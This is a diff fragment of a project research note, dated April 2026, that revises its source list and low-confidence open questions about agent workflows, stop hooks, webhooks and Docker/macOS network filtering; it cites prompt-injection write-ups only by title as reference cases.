+- GitHub Agentic Workflows technical preview (Feb 2026) — Issues-as-task-queue direction
+- Allen Chan AI Agent Anti-Patterns Part 2 (Mar 2026) — verbose tool-trace anti-pattern
+- Anthropic 2026 Agentic Coding Trends Report — layered-review pattern
+- Checkmarx / Copilot Chat markdown injection writeup — C-5 image-beacon exfil
+- Legit Security GitLab Duo remote prompt injection — C-4 canonical case
 
-### Tertiary (LOW confidence — single source or needs empirical validation)
-- Docker Desktop 4.39+ host iptables behavior change: mentioned in one search hit; verify against Docker changelog
-- Whether `user <uid>` filtering works in Darwin pf: needs `pfctl -nf` test on real hardware
-- Exact iptables modules absent from LinuxKit VM: enumerate empirically by running validator on Docker Desktop Mac
+### Tertiary (LOW confidence — validate during implementation)
+- Stop hook exact JSON field names — re-verify with Context7 at Phase D planning time
+- GitHub push webhook payload shape for path-based filter — validate with real payload before Phase E
 
 ---
 *Research completed: 2026-04-13*
-*Milestone: v3.0 macOS Support*
-*Ready for roadmap: YES, with Phase C enforcement-decision spike scheduled as first task*
+*Ready for roadmap: yes*
